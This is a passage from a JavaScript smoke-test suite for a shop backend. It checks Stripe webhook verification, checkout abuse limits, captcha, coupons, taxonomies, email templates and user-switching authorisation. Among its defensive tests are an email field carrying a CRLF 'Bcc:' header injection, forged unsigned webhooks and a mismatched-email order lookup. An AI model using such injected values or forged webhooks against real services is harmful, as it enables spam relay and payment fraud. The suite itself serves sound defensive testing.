      if (stale.status === 401) ok('a REPLAYED (stale-timestamp) webhook is rejected');
      else fail('webhook replay', `status=${stale.status}`);

      const stillUnpaid = await findOrder();
      if ((stillUnpaid?.payment_status ?? 'unpaid') !== 'paid') ok('no forged webhook moved the order to paid');
      else fail('FORGERY ACCEPTED', 'order became paid from an unverified webhook');

      // -- a genuinely signed event for the WRONG AMOUNT must be refused --
      const underpaid = evt({ amount_total: 1 });
      const under = await postHook('stripe', underpaid, stripeSig(underpaid));
      const underJson = await under.json().catch(() => null);
      if (under.status === 200 && underJson?.applied === false && underJson?.action === 'reject') {
        ok('a correctly signed webhook for the wrong AMOUNT is rejected, not captured');
      } else fail('amount gate', `status=${under.status} body=${JSON.stringify(underJson)}`);
      const afterUnder = await findOrder();
      if ((afterUnder?.payment_status ?? 'unpaid') !== 'paid') ok('the underpaid order is still not paid');
      else fail('UNDERPAY ACCEPTED', 'order marked paid for 1 cent');

      // -- the happy path: correct signature, correct amount --
      const goodBody = evt();
      const good = await postHook('stripe', goodBody, stripeSig(goodBody));
      const goodJson = await good.json().catch(() => null);
      if (good.status === 200 && goodJson?.applied === true) ok('a valid, correctly-priced webhook captures the payment');
      else fail('capture', `status=${good.status} body=${JSON.stringify(goodJson)}`);
      const paid = await findOrder();
      if (paid?.payment_status === 'paid') ok('the order is marked paid');
      else fail('payment_status', `${paid?.payment_status} (expected paid)`);
      if (paid?.status === 'processing') ok('a paid order moves to processing (never straight to completed)');
      else fail('order status', `${paid?.status} (expected processing)`);

      // -- idempotency: providers deliver at least once --
      const replay = await postHook('stripe', goodBody, stripeSig(goodBody));
      const replayJson = await replay.json().catch(() => null);
      if (replay.status === 200 && replayJson?.applied === false) ok('re-delivering the SAME event id is a no-op');
      else fail('idempotency', `status=${replay.status} body=${JSON.stringify(replayJson)}`);

      // -- a late failure must never cancel a paid order (it would free stock) --
      const lateFailBody = evt({ payment_status: 'unpaid' });
      const lateFail = await postHook('stripe', lateFailBody.replace('checkout.session.completed', 'checkout.session.expired'), stripeSig(lateFailBody.replace('checkout.session.completed', 'checkout.session.expired')));
      const afterLate = await findOrder();
      if (lateFail.status === 200 && afterLate?.payment_status === 'paid' && afterLate?.status === 'processing') {
        ok('a late failure event does NOT cancel an already-paid order');
      } else fail('late failure', `status=${afterLate?.status} payment=${afterLate?.payment_status}`);

      // -- unknown / unconfigured providers --
      for (const p of ['paypal', 'klarna', 'bogus']) {
        const hook = await postHook(p, '{}');
        if (hook.status === 404) ok(`webhook/${p} is 404 while unconfigured (never a silent 2xx)`);
        else fail('webhook gate', `${p} → ${hook.status} (expected 404)`);
      }

      // -- starting a payment --
      const startDisabled = await fetch(`${BASE}/api/payments/start`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ order_number: orderNumber, email: 'payer@example.com', provider: 'klarna' }),
      });
      if (startDisabled.status === 400) ok('payment start refuses a disabled provider');
      else fail('payment start', `status=${startDisabled.status} (expected 400)`);

      // Order number alone must not be enough — the email is the authorisation.
      const startWrongEmail = await fetch(`${BASE}/api/payments/start`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ order_number: orderNumber, email: 'attacker@example.com', provider: 'stripe' }),
      });
      if (startWrongEmail.status === 404) ok('payment start refuses a mismatched email (no order-number walking)');
      else fail('payment start authz', `status=${startWrongEmail.status} (expected 404)`);

      const startNoBody = await fetch(`${BASE}/api/payments/start`, { method: 'POST', headers: ch, body: '{}' });
      if (startNoBody.status === 400) ok('payment start validates its input');
      else fail('payment start validation', `status=${startNoBody.status}`);
    }

    // --- 8k. CHECKOUT ABUSE (hardening step 4): HTTP-level guards ---
    //
    // tests/checkout-race.test.mjs and tests/checkout-abuse.test.mjs prove
    // these on all three drivers, with FORCED interleavings for the races.
    // Concurrent requests here do not reliably overlap on this codebase, so
    // the concurrency check below is a guard that holds for ANY interleaving,
    // not a race proof. What this block adds is the real stack in front of
    // the handlers: the CORS/CSRF exemption a storefront relies on, the client
    // address the middleware resolves, and the envelope a browser receives.
    //
    // Placed AFTER the payments block on purpose: its last step throttles
    // forged Stripe webhooks from this address for ten minutes.
    {
      const STORE = 'https://frontend.example.com';
      const anon = { 'Content-Type': 'application/json', Origin: STORE };
      const settings = (payload) => fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: ch, body: JSON.stringify(payload),
      });
      const listOrders = async () =>
        (await (await fetch(`${BASE}/api/orders?limit=200`, { headers: { Cookie: sessionCookie } })).json().catch(() => null))?.data ?? [];
      const getOrder = async (id) =>
        (await (await fetch(`${BASE}/api/orders/${id}`, { headers: { Cookie: sessionCookie } })).json().catch(() => null))?.data;
      const placed = new Set();
      const cancelMine = async () => {
        for (const o of await listOrders()) {
          if (placed.has(o.email) && o.status !== 'cancelled' && o.status !== 'refunded') {
            await fetch(`${BASE}/api/orders/${o.id}`, { method: 'PUT', headers: ch, body: JSON.stringify({ status: 'cancelled' }) });
          }
        }
      };
      const abuseProd = await (await mkProduct({ name: 'Abuse Widget', slug: 'smoke-abuse-widget', price_cents: 1200, stock: 60 })).json().catch(() => null);
      const pid = abuseProd?.data?.id;
      const stockOf = async (id = pid) => (await (await fetch(`${BASE}/api/products/${id}`)).json().catch(() => null))?.data?.stock;
      const basket = (email, qty = 1, product = pid) => { placed.add(email); return { email, items: [{ product_id: product, qty }] }; };
      const placeAnon = (body, headers = {}) => fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: { ...anon, ...headers }, body: JSON.stringify(body),
      });
      const placeStaff = (body) => fetch(`${BASE}/api/orders`, { method: 'POST', headers: ch, body: JSON.stringify(body) });
      const errOf = async (res) => (await res.clone().json().catch(() => null))?.error ?? {};

      // -- Idempotency-Key --
      const idemKey = `smoke-idem-${Date.now()}`;
      const idem1 = await placeAnon(basket('idem-smoke@example.com'), { 'Idempotency-Key': idemKey });
      const idem1Json = await idem1.json().catch(() => null);
      const idem2 = await placeAnon(basket('idem-smoke@example.com'), { 'Idempotency-Key': idemKey });
      const idem2Json = await idem2.json().catch(() => null);
      if (idem1.status === 201 && idem2.status === 201 && idem2Json?.data?.number === idem1Json?.data?.number
        && idem2.headers.get('idempotent-replayed') === 'true') {
        ok('Idempotency-Key: a retry through the real stack gets the SAME order back, marked as a replay');
      } else fail('idempotency replay', `first=${idem1.status}/${idem1Json?.data?.number} second=${idem2.status}/${idem2Json?.data?.number} replayed=${idem2.headers.get('idempotent-replayed')}`);
      const idemReused = await placeAnon(basket('idem-smoke@example.com', 2), { 'Idempotency-Key': idemKey });
      if (idemReused.status === 422 && (await errOf(idemReused)).reason === 'IDEMPOTENCY_KEY_REUSED') {
        ok('Idempotency-Key: the same key with a different body is 422 IDEMPOTENCY_KEY_REUSED');
      } else fail('idempotency reuse', `status=${idemReused.status} ${JSON.stringify(await errOf(idemReused))}`);
      const idemCount = (await listOrders()).filter((o) => o.email === 'idem-smoke@example.com').length;
      if (idemCount === 1) ok('Idempotency-Key: ...and exactly one order exists for it');
      else fail('idempotency duplicate orders', `${idemCount} orders`);

      const burstKey = `smoke-burst-${Date.now()}`;
      const burst = await Promise.all([0, 1, 2].map(() =>
        placeAnon(basket('idem-burst@example.com'), { 'Idempotency-Key': burstKey })));
      const burstCodes = burst.map((r) => r.status);
      const burstCount = (await listOrders()).filter((o) => o.email === 'idem-burst@example.com').length;
      if (burstCount === 1 && burstCodes.every((s) => s === 201 || s === 409)) {
        ok(`Idempotency-Key: three simultaneous requests leave ONE order (${burstCodes.join(',')}; HTTP-level guard — the forced race is in checkout-race.test.mjs)`);
      } else fail('idempotency burst', `codes=${burstCodes.join(',')} orders=${burstCount}`);

      // -- the buyer's email is one address, nothing more --
      const injected = await placeAnon({ email: 'smoke@example.com\r\nBcc: victim@example.com', items: [{ product_id: pid, qty: 1 }] });
      if (injected.status === 422) ok('checkout refuses an email carrying a header injection (422)');
      else fail('email header injection', `status=${injected.status}`);

      // -- coupon refusals teach a stranger nothing --
      const quoteAs = async (headers, code) => (await (await fetch(`${BASE}/api/orders/quote`, {
        method: 'POST', headers, body: JSON.stringify({ items: [{ product_id: pid, qty: 1 }], coupon_code: code }),
      })).json().catch(() => null))?.data?.coupon;
      const anonExpired = await quoteAs(anon, 'SMOKEOLD');
      const anonMissing = await quoteAs(anon, 'NOSUCHCODE');
      if (anonExpired?.reason === 'invalid' && anonMissing?.reason === 'invalid' && anonExpired.message === anonMissing.message) {
        ok('coupons: an anonymous quote cannot tell an expired code from a missing one');
      } else fail('coupon oracle', `expired=${JSON.stringify(anonExpired)} missing=${JSON.stringify(anonMissing)}`);
      const anonMinimum = await quoteAs(anon, 'SMOKEBIG');
      if (anonMinimum?.reason === 'minimum-not-met' && anonMinimum.shortfall_cents > 0) {
        ok('coupons: ...but still hears the minimum-spend shortfall');
      } else fail('coupon shortfall', JSON.stringify(anonMinimum));
      const staffExpired = await quoteAs(ch, 'SMOKEOLD');
      if (staffExpired?.reason === 'expired') ok('coupons: staff still see the real reason');
      else fail('coupon staff reason', JSON.stringify(staffExpired));
      const couponOrder = await placeAnon({ ...basket('coupon-smoke@example.com'), coupon_code: 'SMOKEOLD' });
      const couponErr = await errOf(couponOrder);
      if (couponOrder.status === 400 && couponErr.reason === 'checkout.coupon_invalid' && !/expire/i.test(couponErr.message ?? '')) {
        ok('coupons: an anonymous checkout with a dead code is 400 checkout.coupon_invalid, without saying why');
      } else fail('coupon checkout oracle', `status=${couponOrder.status} ${JSON.stringify(couponErr)}`);

      // -- proof-of-work on checkout and magic-link --
      await settings({ captcha_surfaces: ['checkout', 'magic-link'] });
      const noPow = await placeAnon(basket('pow-smoke@example.com'));
      if (noPow.status === 403 && (await errOf(noPow)).reason === 'checkout.captcha_failed') {
        ok('captcha on checkout: a storefront order without a proof is 403 checkout.captcha_failed');
      } else fail('checkout captcha', `status=${noPow.status} ${JSON.stringify(await errOf(noPow))}`);
      const powCh = await (await fetch(`${BASE}/api/captcha/challenge?surface=checkout`, { headers: { Origin: STORE } })).json().catch(() => null);
      let powProof = null;
      if (powCh?.data?.enabled) {
        for (let n = 0; n < 30_000_000 && !powProof; n++) {
          const d = crypto.createHash('sha256').update(`${powCh.data.token}.${n}`).digest();
          let bits = powCh.data.bits;
          let good = true;
          for (let i = 0; bits > 0; i++, bits -= 8) {
            if (d[i] >>> (8 - Math.min(8, bits)) !== 0) { good = false; break; }
          }
          if (good) powProof = `${powCh.data.token}::${n}`;
        }
      }
      const withPow = await placeAnon({ ...basket('pow-smoke@example.com'), pow_token: powProof });
      if (withPow.status === 201) ok('captcha on checkout: a solved proof from the storefront is accepted');
      else fail('checkout captcha solved', `status=${withPow.status} ${JSON.stringify(await errOf(withPow))}`);
      const staffNoPow = await placeStaff(basket('pow-staff@example.com'));
      if (staffNoPow.status === 201) ok('captcha on checkout: staff are not asked for one');
      else fail('checkout captcha staff', `status=${staffNoPow.status}`);
      const magicNoPow = await fetch(`${BASE}/api/auth/magic-link`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: 'admin@local' }),
      });
      if (magicNoPow.status === 403) ok('captcha on magic-link: a request without a proof is 403');
      else fail('magic-link captcha', `status=${magicNoPow.status}`);
      await settings({ captcha_surfaces: [] });

      // -- the unpaid cap, by email --
      // By EMAIL: this suite's requests come from a loopback address, and the
      // per-address count deliberately ignores loopback and private addresses
      // (that is a proxy hop, not a shopper — see isRoutableClientIp). The
      // per-address count is proven in checkout-abuse.test.mjs.
      await cancelMine();
      await settings({ orders_max_unpaid_per_buyer: 3 });
      const capStock = await stockOf();
      const capRuns = [];
      for (let i = 0; i < 5; i++) {
        const r = await placeAnon(basket('Cap-Smoke@Example.com'));
        const e = await errOf(r);
        capRuns.push({ status: r.status, reason: e.reason ?? null, retry: r.headers.get('retry-after') });
      }
      const acceptedCap = capRuns.filter((x) => x.status === 201).length;
      if (capRuns.map((x) => x.status).join(',') === '201,201,201,429,429'
        && capRuns.slice(3).every((x) => x.reason === 'checkout.too_many_unpaid' && Number(x.retry) > 0)) {
        ok('unpaid cap: an anonymous buyer is refused 429 checkout.too_many_unpaid, with Retry-After, once 3 orders are open');
      } else fail('unpaid cap', JSON.stringify(capRuns));
      // Many shoppers, one loopback address: nobody else is refused.
      const otherBuyer = await placeAnon(basket('cap-smoke-other@example.com'));
      if (otherBuyer.status === 201) ok('unpaid cap: a different buyer behind the same (loopback) address is not refused');
      else fail('unpaid cap shared address', `status=${otherBuyer.status} ${JSON.stringify(await errOf(otherBuyer))}`);
      if ((await stockOf()) === capStock - acceptedCap - 1) ok('unpaid cap: a refused checkout reserves nothing');
      else fail('unpaid cap stock', `stock ${capStock} -> ${await stockOf()} with ${acceptedCap} accepted`);
      const staffCap = [];
      for (let i = 0; i < 4; i++) staffCap.push((await placeStaff(basket('cap-staff@example.com'))).status);
      if (staffCap.every((s) => s === 201)) ok('unpaid cap: staff placing orders are not capped');
      else fail('unpaid cap staff', staffCap.join(','));
      await cancelMine();
      await settings({ orders_max_unpaid_per_buyer: 5 });

      // Stripe, signed like the payments block does it.
      const stripeSig = (body) => {
        const t = Math.floor(Date.now() / 1000);
        return `t=${t},v1=${crypto.createHmac('sha256', 'whsec_smoke_secret').update(`${t}.${body}`).digest('hex')}`;
      };
      const stripeHook = (body, signed = true) => fetch(`${BASE}/api/payments/webhook/stripe`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...(signed ? { 'stripe-signature': stripeSig(body) } : {}) },
        body,
      });
      const staffOrderId = async (email) => (await listOrders()).find((o) => o.email === email)?.id;

      // -- a declined card is an attempt, not the end of the order --
      await placeStaff({ ...basket('declined-smoke@example.com'), payment_method: 'stripe' });
      const declinedId = await staffOrderId('declined-smoke@example.com');
      const declinedStock = await stockOf();
      const declineBody = JSON.stringify({
        id: `evt_decline_${Date.now()}`, type: 'payment_intent.payment_failed',
        data: { object: { id: 'pi_smoke', amount: 1200, currency: 'eur', metadata: { order_id: declinedId } } },
      });
      const declined = await stripeHook(declineBody);
      const declinedJson = await declined.json().catch(() => null);
      const declinedOrder = await getOrder(declinedId);
      if (declined.status === 200 && declinedJson?.action === 'decline'
        && declinedOrder?.status === 'pending' && declinedOrder?.payment_declines === 1
        && (await stockOf()) === declinedStock) {
        ok('a declined card leaves the order open with its stock, and is counted (payment_declines=1)');
      } else fail('declined card', `status=${declined.status} body=${JSON.stringify(declinedJson)} order=${declinedOrder?.status}/${declinedOrder?.payment_declines}`);

      // -- a payment that lands after the order was cancelled and its stock sold --
      const lateProd = await (await mkProduct({ name: 'Late Widget', slug: 'smoke-late-widget', price_cents: 1500, stock: 1 })).json().catch(() => null);
      const latePid = lateProd?.data?.id;
      await placeStaff({ ...basket('late-smoke@example.com', 1, latePid), payment_method: 'stripe' });
      const lateId = await staffOrderId('late-smoke@example.com');
      await fetch(`${BASE}/api/orders/${lateId}`, { method: 'PUT', headers: ch, body: JSON.stringify({ status: 'cancelled' }) });
      await placeStaff(basket('late-winner@example.com', 1, latePid));
      const lateRow = await getOrder(lateId);
      const mailsBeforeLate = emailReceiver.deliveries.length;
      const lateBody = JSON.stringify({
        id: `evt_late_${Date.now()}`, type: 'checkout.session.completed',
        data: { object: {
          id: 'cs_late', payment_status: 'paid', amount_total: lateRow?.total_cents,
          currency: String(lateRow?.currency ?? 'EUR').toLowerCase(), metadata: { order_id: lateId },
        } },
      });
      const late = await stripeHook(lateBody);
      const lateOrder = await getOrder(lateId);
      if (late.status === 200 && lateOrder?.status === 'cancelled' && lateOrder?.payment_status === 'paid'
        && lateOrder?.needs_refund === true && (await stockOf(latePid)) === 0) {
        ok('a payment after cancellation, with the stock gone, keeps the order cancelled and flags it needs_refund');
      } else fail('late payment', `status=${late.status} order=${JSON.stringify({ s: lateOrder?.status, p: lateOrder?.payment_status, f: lateOrder?.needs_refund })} stock=${await stockOf(latePid)}`);
      let ownerNotice = null;
      for (let i = 0; i < 40 && !ownerNotice; i++) {
        await wait(100);
        ownerNotice = emailReceiver.deliveries.slice(mailsBeforeLate)
          .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
          .find((m) => m && /paid after it was cancelled/.test(String(m.subject ?? ''))) ?? null;
      }
      if (ownerNotice) ok('...and the owner is emailed about it');
      else fail('needs-refund notice', 'no owner email arrived');

      // -- forged webhooks: audited in aggregate --
      // The per-address THROTTLE is proven in checkout-abuse.test.mjs with
      // routable addresses. This suite's requests come from loopback, which is
      // what every provider looks like behind a proxy that is not trusted —
      // throttling it would let 20 forged posts shut out the real provider, so
      // it is deliberately NOT throttled. Checked here: forged posts stay 401,
      // a real delivery after them still gets through, and the audit log gets
      // a couple of entries rather than one per post.
      const forgedCodes = [];
      for (let i = 0; i < 25; i++) forgedCodes.push((await stripeHook('{"id":"evt_forged"}', false)).status);
      if (forgedCodes.every((s) => s === 401)) ok('forged webhooks from a loopback (proxy) address are refused 401 and never throttled');
      else fail('webhook loopback', forgedCodes.join(','));
      const realAfter = await stripeHook(JSON.stringify({ id: `evt_after_${Date.now()}`, type: 'invoice.upcoming', data: { object: {} } }));
      if (realAfter.status === 200) ok('...so a real delivery after them still gets through');
      else fail('webhook after forged burst', `status=${realAfter.status}`);
      await wait(300);
      const invalidAudits = ((await (await fetch(`${BASE}/api/audit?action=payment.webhook.invalid&limit=500`, {
        headers: { Cookie: sessionCookie },
      })).json().catch(() => null))?.data ?? []).filter((e) => e.target === 'stripe');
      // One for the ten-minute window these ~30 failures fell in; two if the
      // payments block's four fell in an earlier one.
      if (invalidAudits.length >= 1 && invalidAudits.length <= 2) {
        ok(`forged webhooks: ~30 failures are ${invalidAudits.length} audit entr${invalidAudits.length === 1 ? 'y' : 'ies'}, not one each`);
      } else fail('webhook audit aggregation', `${invalidAudits.length} entries`);

      await cancelMine();
    }

    // --- new public surfaces are actually REACHABLE ---
    // A route can be perfectly implemented and still 401 because it was never
    // added to the middleware allow-list. That happened to all three of these,
    // and only a live request catches it.
    {
      const withdrawal = await fetch(`${BASE}/api/legal/withdrawal`);
      // 200 (configured) or 503 (trader details missing) — never 401/404.
      if ([200, 503].includes(withdrawal.status)) ok('the withdrawal notice endpoint is publicly reachable');
      else fail('withdrawal reachability', `status=${withdrawal.status} (expected 200 or 503)`);
      if (withdrawal.status === 503) ok('an unconfigured shop publishes NO notice rather than a blank one');

      // Configure a trader and it must publish.
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({
          trader_legal_name: 'Smoke Trading Ltd',
          trader_address: 'Hauptstr. 1, 10115 Berlin',
          trader_email: 'returns@smoke.example',
        }),
      });
      const published = await (await fetch(`${BASE}/api/legal/withdrawal`)).json().catch(() => null);
      if (published?.data?.enabled && published.data.withdrawal_days === 14) ok('a configured shop publishes a 14-day notice');
      else fail('withdrawal publish', JSON.stringify(published)?.slice(0, 140));
      if (/Smoke Trading Ltd/.test(published?.data?.instructions ?? '')) ok('the notice carries the trader identity');
      else fail('withdrawal trader', (published?.data?.instructions ?? '').slice(0, 100));
      if (/obligation to pay/i.test(published?.data?.order_button_label ?? '')) ok('the Art. 8(2) order-button label is provided');
      else fail('order button label', published?.data?.order_button_label);
      if (/Annex I/i.test(published?.data?.disclaimer ?? '')) ok('the notice is labelled as generated, not as legal advice');
      else fail('disclaimer', published?.data?.disclaimer);

      // Assistant proxy: unconfigured must be 404 (looks absent), never 401.
      const chat = await fetch(`${BASE}/api/assistant/chat`, {
        method: 'POST', headers: ch, body: JSON.stringify({ message: 'hello' }),
      });
      if (chat.status === 404) ok('the assistant proxy is reachable and 404s while unconfigured');
      else fail('assistant reachability', `status=${chat.status} (expected 404)`);

      // TAXONOMIES (C-128), end to end: define one, add a term, put it on a
      // post, read it back, and check the public archive obeys its opt-in.
      const taxPut = await fetch(`${BASE}/api/taxonomies`, {
        method: 'PUT', headers: ch,
        body: JSON.stringify({ taxonomies: [
          { slug: 'brand', label: 'Brand', appliesTo: ['post'], publicArchive: true },
          { slug: 'supplier', label: 'Supplier', appliesTo: ['product'] },
        ] }),
      });
      if (taxPut.ok) ok('taxonomies can be defined');
      else fail('taxonomy define', `status=${taxPut.status}`);

      const taxReserved = await fetch(`${BASE}/api/taxonomies`, {
        method: 'PUT', headers: ch,
        body: JSON.stringify({ taxonomies: [{ slug: 'category', label: 'X', appliesTo: ['post'] }] }),
      });
      if (taxReserved.status === 400) ok('...and a reserved slug is refused');
      else fail('taxonomy reserved', `status=${taxReserved.status}`);

      // A GREEK term name, because that is what both live installs type. An
      // ASCII-only slug rule reduces it to nothing and the assignment is
      // silently dropped.
      const termRes = await fetch(`${BASE}/api/taxonomies`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ taxonomy: 'brand', name: 'Ωμέγα' }),
      });
      const termJson = await termRes.json().catch(() => null);
      const termSlugValue = termJson?.data?.slug;
      if (termRes.status === 201 && termSlugValue) ok('a Greek term name produces a usable slug');
      else fail('greek term', `status=${termRes.status} ${JSON.stringify(termJson)}`);

      const termAgain = await fetch(`${BASE}/api/taxonomies`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ taxonomy: 'brand', name: 'Ωμέγα' }),
      });
      if (termAgain.ok) ok('...and adding it twice is not an error');
      else fail('term idempotent', `status=${termAgain.status}`);

      if (termSlugValue) {
        const taxSlug = `smoke-tax-${Date.now().toString(36)}`;
        const taxPost = await fetch(`${BASE}/api/posts`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({
            title: 'Tagged', slug: taxSlug, status: 'published', content: '<p>x</p>',
            // `supplier` does not apply to a post and `invented` does not exist:
            // both must be dropped rather than stored.
            terms: { brand: [termSlugValue], supplier: ['acme'], invented: ['x'] },
          }),
        });
        const taxPostJson = await taxPost.json().catch(() => null);
        const storedTerms = taxPostJson?.data?.terms;
        if (JSON.stringify(storedTerms) === JSON.stringify({ brand: [termSlugValue] }))
          ok('a post stores only the terms that apply to it');
        else fail('post terms', JSON.stringify(storedTerms));

        // The public archive, which the taxonomy opted into.
        const archive = await fetch(`${BASE}/t/brand/${encodeURIComponent(termSlugValue)}`);
        const archiveHtml = await archive.text();
        if (archive.status === 200 && /Tagged/.test(archiveHtml)) ok('the term archive lists the post');
        else fail('term archive', `status=${archive.status}`);

        // The one that did NOT opt in must 404 rather than render an empty page.
        const privateArchive = await fetch(`${BASE}/t/supplier/acme`);
        if (privateArchive.status === 404) ok('...and a taxonomy without a public page 404s');
        else fail('private archive', `status=${privateArchive.status}`);

        const unknownTerm = await fetch(`${BASE}/t/brand/no-such-term`);
        if (unknownTerm.status === 404) ok('...and an unknown term 404s rather than showing an empty archive');
        else fail('unknown term', `status=${unknownTerm.status}`);

        // An unrelated edit must not clear the terms — the storage layer merges.
        const editRes = await fetch(`${BASE}/api/posts/${encodeURIComponent(taxPostJson.data.id)}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ title: 'Tagged, renamed' }),
        });
        const editJson = await editRes.json().catch(() => null);
        if (JSON.stringify(editJson?.data?.terms) === JSON.stringify({ brand: [termSlugValue] }))
          ok('...and an unrelated edit leaves the terms alone');
        else fail('terms cleared', JSON.stringify(editJson?.data?.terms));
      }

      // Definitions are admin; anonymous callers get nothing.
      const taxAnon = await fetch(`${BASE}/api/taxonomies`);
      if (taxAnon.status === 401 || taxAnon.status === 403) ok('the taxonomy list is closed to anonymous callers');
      else fail('taxonomy open', `status=${taxAnon.status}`);

      // EMAIL WORDING (C-112). The gate that matters: a template missing a
      // REQUIRED placeholder must be refused, because the email it produces
      // sends, looks fine and cannot reset anybody's password.
      const tplList = await fetch(`${BASE}/api/email-templates`, { headers: ch });
      const tplJson = await tplList.json().catch(() => null);
      if (tplList.ok && Array.isArray(tplJson?.data?.templates) && tplJson.data.templates.length >= 4)
        ok('the email templates are readable, with a server-rendered preview');
      else fail('email templates', `status=${tplList.status} ${JSON.stringify(tplJson?.data ?? tplJson).slice(0, 120)}`);

      const tplAnon = await fetch(`${BASE}/api/email-templates`);
      if (tplAnon.status === 401 || tplAnon.status === 403) ok('...and closed to anyone but an admin');
      else fail('email templates open', `status=${tplAnon.status}`);

      const badTpl = await fetch(`${BASE}/api/email-templates`, {
        method: 'PUT', headers: ch,
        body: JSON.stringify({ id: 'password_reset', subject: 'Reset', body: 'No link in here.' }),
      });
      const badJson = await badTpl.json().catch(() => null);
      if (badTpl.status === 400 && /reset_link/.test(badJson?.message ?? badJson?.error?.message ?? ''))
        ok('a password reset without its link is refused, and the message names it');
      else fail('required placeholder', `status=${badTpl.status} ${JSON.stringify(badJson).slice(0, 140)}`);

      const goodTpl = await fetch(`${BASE}/api/email-templates`, {
        method: 'PUT', headers: ch,
        body: JSON.stringify({ id: 'password_reset', subject: 'Νέος κωδικός', body: 'Πατήστε: {{reset_link}}' }),
      });
      const goodJson = await goodTpl.json().catch(() => null);
      if (goodTpl.ok && goodJson?.data?.preview?.subject === 'Νέος κωδικός')
        ok('...and a valid one saves, with the preview coming back rendered');
      else fail('template save', `status=${goodTpl.status} ${JSON.stringify(goodJson?.data ?? goodJson).slice(0, 140)}`);

      const resetTpl = await fetch(`${BASE}/api/email-templates?id=password_reset`, { method: 'DELETE', headers: ch });
      if (resetTpl.ok) ok('...and reverts to the built-in wording');
      else fail('template reset', `status=${resetTpl.status}`);

      // THE POPUP (C-114). /popup.js must 404 while the plugin is inactive —
      // that is what "a plugin an install never asked for costs nothing" means.
      const popupOff = await fetch(`${BASE}/popup.js`);
      if (popupOff.status === 404) ok('/popup.js is absent while the popups plugin is off');
      else fail('popup served', `status=${popupOff.status}`);

      const anyPage = await (await fetch(`${BASE}/blog`)).text();
      if (!/popup\.js/.test(anyPage)) ok('...and no page links it');
      else fail('popup tag', 'a page links /popup.js with the plugin off');

      // USER SWITCHING (C-141). The rules that keep it from being a back door,
      // asserted against the live route rather than read off the source.
      const switchAnon = await fetch(`${BASE}/api/users/switch`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user_id: 'anyone' }),
      });
      if (switchAnon.status === 401 || switchAnon.status === 403) ok('an anonymous caller cannot switch user');
      else fail('switch open', `status=${switchAnon.status}`);

      if (sessionCookie && csrfToken) {
        const switchHdrs = {
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
        };
        // The smoke's session is the seeded admin. Switching to yourself, and
        // switching to a non-existent account, are both refused.
        // `/api/users/get`, not `/api/users` — the latter is not a route, so
        // the first version of this block got a 404, an empty list, and
        // silently skipped every assertion inside it. `assertListed` below
        // makes that impossible to repeat.
        const usersRes = await fetch(`${BASE}/api/users/get`, { headers: switchHdrs });
        const usersJson = await usersRes.json().catch(() => null);
        const all = Array.isArray(usersJson?.data) ? usersJson.data : (usersJson?.data?.users ?? []);
        // A guard, not an assumption: an empty list here means the assertions
        // that follow are all skipped, which reads as green.
        if (all.length > 0) ok('the user list is readable, so the checks below can run');
        else fail('user list empty', `status=${usersRes.status} — every user assertion below would silently skip`);
        const anotherAdmin = all.find((u) => u.role === 'admin');
        if (anotherAdmin) {
          const ontoAdmin = await fetch(`${BASE}/api/users/switch`, {
            method: 'POST', headers: switchHdrs, body: JSON.stringify({ user_id: anotherAdmin.id }),
          });
          // Either "that is already you" (400) or "not onto another admin"
          // (403) — both are refusals, and which one depends only on whether
          // the seed has a second admin.
          if (ontoAdmin.status === 400 || ontoAdmin.status === 403) ok('an admin cannot be impersonated');
          else fail('switch onto admin', `status=${ontoAdmin.status}`);
        }
        const missing = await fetch(`${BASE}/api/users/switch`, {
          method: 'POST', headers: switchHdrs, body: JSON.stringify({ user_id: 'no-such-user' }),
        });
        if (missing.status === 404) ok('...and an unknown user is a 404, not a session');
        else fail('switch unknown user', `status=${missing.status}`);

        // THE REPLAY PATH, end to end. This is the one that mattered: a switch
        // cookie left on a shared browser used to be a one-click admin session
        // for whoever signed in next.
        //
        // Done with a REAL switch onto a real non-admin, so the cookie is
        // genuine rather than hand-made — a forged one proves only that the
        // HMAC works, which was never in doubt.
        // Created here rather than hoped for. The first version of this block
        // looked for an existing non-admin, found none on a seeded install, and
        // skipped SILENTLY — the whole replay test, which is the reason this
        // section exists, never ran once and the suite still reported green.
        const switchTargetEmail = `switch-target-${Date.now().toString(36)}@example.com`;
        const mkTarget = await fetch(`${BASE}/api/users/create`, {
          method: 'POST', headers: switchHdrs,
          body: JSON.stringify({ name: 'Switch Target', email: switchTargetEmail, role: 'author', password: 'switch-target-pass-9' }),
        });
        const mkTargetJson = await mkTarget.json().catch(() => null);
        const victim = mkTargetJson?.data?.id ? { id: mkTargetJson.data.id, role: 'author' } : null;
        // THE SEEDED ADMIN MUST STAY EDITABLE.
        //
        // The admin's user form posts every field it renders, including the
        // email, whether or not the operator touched it — so a stored address
        // that fails today's shape rule made the whole record uneditable. The
        // seeded `admin@local` is exactly such an address: this software
        // creates it and then refused it, so on a fresh install the very first
        // thing an operator might do (rename the account, change its role)
        // failed with "email has invalid format" about a value they never
        // typed.
        const seeded = all.find((u) => u.role === 'admin');
        if (seeded) {
          const echoed = await fetch(`${BASE}/api/users/update`, {
            method: 'POST', headers: switchHdrs,
            body: JSON.stringify({
              id: seeded.id, name: seeded.name, email: seeded.email,
              role: seeded.role, status: seeded.status,
            }),
          });
          if (echoed.ok) ok('an admin can be edited with its own address echoed back');
          else fail('seeded admin uneditable', `status=${echoed.status} — the form's own payload is refused`);

          // ...and the rule still does its job on a NEW address. It is right
          // for the places that matter — the newsletter and contact forms,
          // where requiring a dot in the domain catches a real typo.
          const typo = await fetch(`${BASE}/api/users/update`, {
            method: 'POST', headers: switchHdrs,
            body: JSON.stringify({ id: seeded.id, email: 'someone@gmailcom' }),
          });
          if (typo.status === 422 || typo.status === 400) ok('...while a typo in a NEW address is still refused');
